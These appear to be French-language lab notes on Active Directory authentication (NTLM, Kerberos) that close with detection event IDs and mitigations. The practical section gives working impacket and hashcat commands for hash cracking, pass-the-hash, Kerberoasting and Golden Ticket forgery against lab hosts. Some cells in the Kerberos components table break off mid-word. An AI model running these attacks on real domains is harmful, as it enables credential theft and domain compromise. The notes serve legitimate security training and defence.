## Authentication in AD

### Authentication Material

|Type|Description|
|---|---|
|Username + Password|Credential classique|
|Certificates|Émis par une CA, utilisé pour machines / smart cards|
|Hashes|Pas prévu à la base, exploitable en attaque (pass-the-hash)|

### Authentication vs Authorisation

- **Authentication** : prouve l'identité ("Tu es John")
- **Authorisation** : détermine les droits ("John accède au share finance")

Authentication → toujours en premier → puis vérification groupes/ACL.

### AD Authentication Protocols

Deux protocoles core :

- **NTLM** (NetNTLM) : challenge-response, héritage Windows NT
- **Kerberos** : ticket-based, défaut depuis Windows 2000

Les autres mécanismes (TLS/SSL, smart card) émettent in fine un ticket Kerberos.

LDAP, WebDAV, SMB = protocoles de service → s'appuient sur NTLM ou Kerberos pour l'auth réelle.

> Presque toutes les attaques AD ciblent des faiblesses dans NTLM ou Kerberos.

---

## NetNTLM Authentication

### What is NTLM?

Challenge-response protocol, héritage Windows NT. Toujours présent en fallback ou sur systèmes legacy.

|Version|État|
|---|---|
|NTLMv1|Hautement non sécurisé|
|NTLMv2|Plus fort, mais toujours vulnérable|

### How NTLM Authentication Works

![[ad authentication ntlm.png]]

1. Client envoie son username au serveur
2. Serveur génère un **challenge** (nonce 16 bytes) → envoyé au client
3. Client chiffre le challenge avec son **NT hash** → envoie la réponse
4. Serveur forward : username + challenge + réponse → **Domain Controller**
5. DC récupère le NT hash en base, chiffre le même challenge
6. DC compare → si match → auth OK → serveur accorde l'accès

> Le mot de passe ne transite jamais sur le réseau, uniquement la réponse chiffrée.

Différence clé avec Kerberos : avec NTLM, l'auth se fait **via le service** qui vérifie auprès du DC. Avec Kerberos, on s'authentifie **directement au DC** puis on présente un ticket.

### Drawbacks of NTLM

- Pas de mutual authentication → vulnérable au MITM
- NTLMv1 : DES + hashes non salés → crackables rapidement
- Relay attacks : interception + relai de l'auth vers d'autres services
- **Pass-the-hash** : le NT hash suffit pour s'authentifier sans connaître le mot de passe
- Chaque auth nécessite un aller-retour DC → lent en grand environnement

### When is NTLM Used?

- DC injoignable (pas de ticket Kerberos possible)
- Accès par **IP** au lieu d'un hostname (Kerberos requiert un SPN/DNS)
- Service sans SPN enregistré dans l'AD
- Machine hors domaine
- Applications legacy

### NTLM Authentication with Impacket

bash

```bash
impacket-smbclient thm.loc/claire:'Password123!'@192.168.11.51
```

```
# shares        → liste les shares
# use SHARE1    → se connecte au share
```

---

## Kerberos Authentication

### What is Kerberos?

Protocole développé par MIT, défaut depuis Windows 2000. Nommé d'après Cerbère (chien à 3 têtes, gardien des enfers).

Différence clé avec NTLM : on s'authentifie **d'abord au DC** → on reçoit des tickets → on les présente aux services.

### Key Kerberos Components

| Composant                     | Rôle                                                                                                                         |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| KDC (Key Distribution Center) | Service sur le DC, gère toutes les requêtes de tickets. Contient AS (Authentication Service) + TGS (Ticket Granting Service) |
| AS (Authentication Service)   | Vérifie l'identité, émet le                                                                                                  |
| TGS (Ticket Granting Service) | Émet les Service Tickets sur présentation d'un TGT va                                                                        |
| TGT (Ticket Granting Ticket)  | Ticket principal, obtenu après auth ini                                                                                      |
| ST (Service Ticket)           | Ticket d'accès à un service spéc                                                                                             |
| SPN                           | Identifiant unique d'un service da                                                                                           |
| KRBTGT                        | Compte spécial dont le hash chiffre tous les TGT → compromis = Golde                                                         |

### How Kerberos Authentication Works

**Step 1 — AS-REQ**

1. Client envoie username + timestamp chiffré avec son hash → KDC

**Step 2 — AS-REP** 

2. KDC déchiffre le timestamp, valide l'identité 
3. KDC répond avec :

- Session key chiffrée avec le hash user
- **TGT** chiffré avec le hash KRBTGT (opaque pour le client)

![[ad authentication kerberos step 1&2.png]]

**Step 3 — TGS-REQ** 

4. Client envoie au KDC : TGT + SPN du service visé + authenticator (chiffré avec session key)

**Step 4 — TGS-REP** 5. KDC déchiffre le TGT, valide, répond avec :

- **Service Ticket** chiffré avec le hash du service cible
- Service session key

![[ad authentication kerberos step 3&4.png]]

**Step 5 — AP-REQ** 

6. Client présente le ST au service → service déchiffre avec son propre hash → accès accordé

![[ad authentication kerberos step 5.png]]

### Benefits of Kerberos

- Mutual authentication → protège contre MITM
- Aucun hash/password ne transite sur le réseau
- SSO : un TGT suffit pour tous les services
- Performance : le DC n'est contacté qu'à l'init, pas à chaque requête
- Tickets limités dans le temps (TGT ~ 10h par défaut)

### Drawbacks of Kerberos

- Synchro horaire requise (± 5 min max)
- KDC = SPOF
- **Pass-the-Ticket** : ticket volé → usurpation d'identité
- **Golden Ticket** : hash KRBTGT compromis → forge de TGT arbitraires
- **Kerberoasting** : tout utilisateur authentifié peut demander un ST → chiffré avec le hash du compte de service → crackable offline

### Credential Cache (ccache) Files

Stockage des tickets Kerberos sur Linux.

|Info|Valeur|
|---|---|
|Emplacement par défaut|`/tmp/krb5cc_<uid>`|
|Variable d'env|`KRB5CCNAME`|
|Commande d'inspection|`klist`|

Obtenir un ccache = s'authentifier comme l'utilisateur sans son mot de passe (**Pass-the-Ticket / Pass-the-ccache**).

### Kerberos Authentication with Impacket

bash

```bash
# 1. Ajouter le hostname (obligatoire, Kerberos = DNS)
echo 192.168.11.51 SERVER1.thm.loc >> /etc/hosts

# 2. Obtenir un TGT → génère mary.ccache
impacket-getTGT thm.loc/mary:'SuperLongForKerberos123!' -dc-ip 192.168.11.100

# 3. Pointer sur le ccache
export KRB5CCNAME=mary.ccache

# 4. S'authentifier via Kerberos (pas de password)
impacket-smbclient thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

> `-k` = Kerberos auth | `-no-pass` = ticket utilisé à la place du mot de passe

⚠️ **Note:** When using Kerberos, you must use the **hostname** (not the IP address) because Kerberos relies on SPNs which are tied to DNS names.

---

## Weaknesses in AD Authentication

### Common Authentication Weaknesses in AD

**NTLM**

|Attaque|Principe|
|---|---|
|Weak Cryptography|MD4 sans sel → rainbow tables + brute-force GPU|
|Pass-the-Hash|Hash seul suffit pour s'authentifier, pas besoin du mot de passe clair|
|NTLM Relay|Pas de mutual auth → interception + relai vers d'autres services|
|Downgrade|Force le fallback Kerberos → NTLM pour exploiter ses faiblesses|

**Kerberos**

|Attaque|Principe|
|---|---|
|Kerberoasting|Tout user authentifié peut demander un ST → chiffré avec hash du compte service → crack offline|
|AS-REP Roasting|Pre-auth désactivée → hash extractable sans aucune auth préalable|
|Pass-the-Ticket|Ticket extrait de la mémoire → réutilisé sans connaître le mot de passe|
|Overpass-the-Hash|Hash NTLM → converti en TGT Kerberos|
|Golden Ticket|Hash KRBTGT compromis → forge de TGT pour n'importe quel user|
|Silver Ticket|Hash d'un compte service → forge de ST pour un service spécifique, sans contacter le KDC|

**Configuration**

- Mots de passe faibles / non rotés (comptes service++)
- Password Spraying : un mot de passe commun testé sur tous les comptes
- Delegation mal configurée → escalade de privilèges
- Comptes obsolètes (ex-employés, machines) → cibles faciles

### Practical Demonstrations

#### Weak Password Hashing

You have obtained the following NTLM hash for the user `phillip`:

```bash
phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::
```

Format du hash récupéré : `username:uid:LM_hash:NTLM_hash:::`

bash

```bash
# Cracker le hash NTLM
echo "939B0058BC6DD834ABC4CC08CFEFEA69" > hash.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt --show  # afficher le résultat

# S'authentifier avec le mot de passe récupéré
impacket-smbclient "thm.loc/phillip:<PASSWORD>"@192.168.11.51
```

Mode `1000` for NTLM hashes

**Why This Works:** NTLM hashes are unsalted and use the relatively fast MD4 algorithm, making them extremely quick to crack with modern hardware. Weak passwords fall quickly to dictionary and rule-based attacks.

#### Pass-the-Hash

**Practical Demonstration**

You have obtained the NTLM hash for the user `ben`: 
63CF41DC25C04B8FB79E44B1DEF12C10

bash

```bash
# Hash seul, pas besoin du mot de passe
impacket-smbclient thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
```

Format `-hashes` : `LM_hash:NTLM_hash` — le LM hash vide est toujours `aad3b435b51404eeaad3b435b51404ee`.

**Why This Works:** The NTLM protocol uses the hash directly in its challenge-response mechanism. The actual plaintext password is never used after the initial hashing. As a result, possessing the hash is functionally equivalent to knowing the password when authenticating via NTLM.

#### Kerberoasting

First, you need to identify service accounts that have registered SPNs. Let's use Claire's account with Impacket's `GetUserSPNs.py` to enumerate these accounts:

bash

```bash
# Énumérer les SPN + récupérer les tickets
impacket-GetUserSPNs thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request

# Cracker le ticket (mode 13100 = Kerberos TGS-REP)
hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt

# S'authentifier avec le mot de passe récupéré
impacket-smbclient "thm.loc/svc_printer:<PASSWORD>"@192.168.11.51
```

mode `13100` to crack Kerberos TGS-REP tickets

**Why This Works:** Service tickets are encrypted using the service account's password hash and can be requested by any authenticated user. Since the encryption is performed with RC4 or AES, the tickets can be subject to offline password cracking. Service accounts often have weak or unchanged passwords because they are not rotated regularly like user passwords.

#### Golden Ticket

You have obtained the KRBTGT hash for the domain:

KRBTGT Hash: e9a9871b93d7b4d73c91665bd6df6e50 
Domain SID: S-1-5-21-990021728-513958382-3715561918

bash

```bash
# Forger un TGT pour Administrator avec le hash KRBTGT
impacket-ticketer -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
# → génère Administrator.ccache

# Utiliser le ticket forgé
export KRB5CCNAME=Administrator.ccache
impacket-smbclient thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

**Why This Works:** All Kerberos TGTs are encrypted and signed using the KRBTGT account's password hash. If an attacker obtains this hash, they can forge tickets that the domain controllers will accept as legitimate. The forged tickets can grant any level of access and are virtually indistinguishable from legitimate tickets.

> Golden Ticket reste valide tant que le mot de passe KRBTGT n'est pas réinitialisé **deux fois** (since the previous password is also cached).

⚠️ Remember that when using Kerberos authentication, you must use the hostname rather than the IP address

## Understanding the Impact

Weak passwords + failles protocolaires + credentials mal protégés = compromission totale du domaine.

L'authentification ne se limite pas à laisser les utilisateurs se connecter — elle doit garantir que les credentials ne peuvent pas être volés, réutilisés ou forgés.

---

## Detections & Mitigations

### Key Windows Event IDs

|Event ID|Log|Description|
|---|---|---|
|4624|Security|Logon réussi — vérifier Authentication Package + Logon Type|
|4625|Security|Logon échoué — détection password spraying|
|4768|Security|TGT Kerberos demandé|
|4769|Security|Service ticket Kerberos demandé — clé pour Kerberoasting|
|4771|Security|Pre-auth Kerberos échouée — AS-REP Roasting + brute force|

### Detecting NTLM-Based Attacks

Sur **4624**, indicateurs d'un logon NTLM suspect :

- `Authentication Package` = **NTLM** (Kerberos affiche `Kerberos`)
- `Logon Type` = **3** (network logon, typique PtH via SMB/WinRM)
- `Source Network Address` = **vide** — le DC ne remonte pas l'IP source sur les logons NTLM, contrairement à 4768/4769

Un logon NTLM de type 3 sur un DC = fort indicateur de Pass-the-Hash.

### Detecting Kerberoasting

Sur **4769**, deux signaux :

- Pic de requêtes depuis un seul compte en peu de temps
- `Ticket Encryption Type` = **0x17** (RC4-HMAC) alors que les environnements modernes utilisent **0x12** (AES-256) → downgrade délibéré pour faciliter le crack offline

Sur **4771** :

- Pic sur plusieurs comptes en peu de temps → AS-REP Roasting ou brute-force

### Mitigations

|Attaque|Mitigation|
|---|---|
|Pass-the-Hash|Ajouter les comptes privilégiés au groupe **Protected Users** ; désactiver NTLM si Kerberos disponible|
|NTLM Relay|Activer **SMB signing** ; activer EPA sur LDAP et AD CS|
|Kerberoasting|Mots de passe forts et aléatoires sur les comptes service → migrer vers **gMSA**|
|Golden Ticket|Protéger le compte KRBTGT ; reset du mot de passe **deux fois** après compromission|
|Password Spray|Configurer account lockout ; monitorer **4625** sur de nombreux comptes|

---

